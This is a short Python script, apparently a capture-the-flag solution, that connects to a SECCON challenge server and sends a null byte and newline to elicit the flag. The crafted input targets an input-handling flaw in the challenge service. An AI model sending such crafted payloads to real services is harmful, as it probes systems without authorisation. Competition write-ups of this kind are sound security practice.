import socket

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect(('find-flag.seccon.games', 10042))
    data = s.recv(1024)
    s.send(b'\x00\x0a')
    print(s.recv(1024))
